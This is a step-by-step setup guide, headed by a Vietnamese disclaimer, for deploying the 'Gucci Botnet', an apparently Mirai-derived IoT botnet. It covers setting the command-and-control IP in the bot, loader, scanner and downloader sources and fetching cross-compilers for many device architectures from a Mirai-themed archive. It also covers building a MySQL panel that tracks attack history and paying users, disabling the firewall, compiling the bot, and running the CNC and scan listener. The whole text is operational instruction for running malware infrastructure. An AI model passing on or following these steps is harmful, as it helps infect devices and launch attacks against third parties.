# Miễn trừ trách nhiệm và chỉ mang tính chất tham khảo

# Gucci Botnet Setup Guide
This guide provides detailed instructions to set up the Gucci Botnet on a Linux system using the `yum` package manager. Follow each step carefully to install dependencies, configure the environment, and compile the botnet. Prerequisites: A Linux system with `yum` (e.g., CentOS or RHEL), Root or sudo access, An active internet connection.

Run the following commands:
# Change Ip:
```bash
// Change all the ips into your botnet ip
 CHANGE IP(s)
 scanListen.go (line 14)
 loader/src/main.c (line 33)
 loader/src/headers/config.h (line 3, 6)
 dlr/main.c (line 8)
 bot/main.c (line 365)
 bot/scanner.c (line 891)
```
# B1:
```bash
yum update -y
yum install epel-release -y
yum groupinstall "Development Tools" -y
yum install gmp-devel -y
ln -s /usr/lib64/libgmp.so.3 /usr/lib64/libgmp.so.10
yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
```
# B2:
```bash
mkdir /etc/xcompile
cd /etc/xcompile
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i586.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i686.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-m68k.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mips.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-mipsel.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-powerpc.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sh4.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-sparc.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv4l.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv5l.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv6l.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv7l.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-powerpc-440fp.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-x86_64.tar.bz2
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-i486.tar.gz

tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
tar -vxf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
tar -jxf cross-compiler-powerpc-440fp.tar.bz2
tar -jxf cross-compiler-x86_64.tar.bz2
tar -xvf cross-compiler-i486.tar.gz

rm -rf *.tar.bz2 *.tar.gz *.tar *.tar.xz

mv cross-compiler-i586 i586
mv cross-compiler-i686 i686
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install arc
mv cross-compiler-powerpc-440fp powerpc-440fp
mv cross-compiler-x86_64 x86_64

```
# B3:
```bash
wget https://go.dev/dl/go1.21.3.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.21.3.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
go version
go env -w GO111MODULE=off
go get -u github.com/go-sql-driver/mysql
```
# B4:
```bash
yum install mariadb-server -y
systemctl start mariadb.service
mysql_secure_installation
```
# B5:
```bash
mysql -pYOURPASSWORD
mysql -u root -p
```
# B6:
```bash
USE mysql;
GRANT ALL ON *.* TO root@'%' IDENTIFIED BY 'root';
FLUSH PRIVILEGES;
CREATE DATABASE gucci;
USE gucci;
CREATE TABLE `history` (`id` INT(10) UNSIGNED NOT NULL AUTO_INCREMENT, `user_id` INT(10) UNSIGNED NOT NULL, `time_sent` INT(10) UNSIGNED NOT NULL, `duration` INT(10) UNSIGNED NOT NULL, `command` TEXT NOT NULL, `max_bots` INT(11) DEFAULT '-1', PRIMARY KEY (`id`), KEY `user_id` (`user_id`));
CREATE TABLE `users` (`id` INT(10) UNSIGNED NOT NULL AUTO_INCREMENT, `username` VARCHAR(32) NOT NULL, `password` VARCHAR(32) NOT NULL, `duration_limit` INT(10) UNSIGNED DEFAULT NULL, `cooldown` INT(10) UNSIGNED NOT NULL, `wrc` INT(10) UNSIGNED DEFAULT NULL, `last_paid` INT(10) UNSIGNED NOT NULL, `max_bots` INT(11) DEFAULT '-1', `admin` INT(10) UNSIGNED DEFAULT '0', `intvl` INT(10) UNSIGNED DEFAULT '30', `api_key` TEXT, PRIMARY KEY (`id`), KEY `username` (`username`));
CREATE TABLE `whitelist` (`id` INT(10) UNSIGNED NOT NULL AUTO_INCREMENT, `prefix` VARCHAR(16) DEFAULT NULL, `netmask` TINYINT(3) UNSIGNED DEFAULT NULL, PRIMARY KEY (`id`), KEY `prefix` (`prefix`));
INSERT INTO users VALUES (NULL, 'root', 'root@123', 0, 0, 0, 0, -1, 1, 30, '');
CREATE TABLE `logins` (`id` INT(11) NOT NULL, `username` VARCHAR(32) NOT NULL, `action` VARCHAR(32) NOT NULL, `ip` VARCHAR(15) NOT NULL, `timestamp` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP) ENGINE=InnoDB DEFAULT CHARSET=latin1;
EXIT;
```
# B7:
```bash
service iptables stop
service httpd restart
service mariadb.service restart
```
# B8:
```bash
//scroll down and edit the 1024 to 999999
//THEN SAVE IT 
nano /usr/include/bits/typesizes.h
ulimit -n 999999
ulimit -u 999999
ulimit -e 999999
```
# B9:
```bash
chmod 777 *
sh build.sh
```
# AND B10:
```bash
screen ./cnc
screen ./scanListen
```
# HELP:
```bash
//connect to the cnc
ip:5555 (connection: telnet)
//use your login credentials you have changed before
```
